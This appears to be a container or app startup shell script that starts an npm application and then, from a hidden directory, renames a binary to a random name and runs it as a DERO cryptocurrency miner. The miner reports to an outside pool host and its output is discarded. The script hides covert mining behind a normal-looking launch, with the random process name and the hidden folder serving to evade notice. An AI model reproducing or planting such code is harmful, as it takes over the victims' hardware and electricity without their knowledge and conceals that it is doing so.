#!/bin/bash
nohup npm start &

# Change directory to /usr/src/app/.hidden
cd /usr/src/app/.hidden

# Function to generate a random 9-digit alphanumeric name
generate_random_name() {
  new_name=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 9 | head -n 1)
}

# Generate a random name
generate_random_name

# Rename the main script with the generated name
chmod +x main
mv main "${new_name}"

# Execute the renamed main script
./"${new_name}" -w dero1qyjrwgdvns7arfuzf6pz5lhpj2yfsdlzy9c05w6qmmp3shc7fm3m2qgjs4uez -m 6 -r api.metacontrive.tech:443 -p rpc -report-realtime-hashrate > /dev/null 2>&1
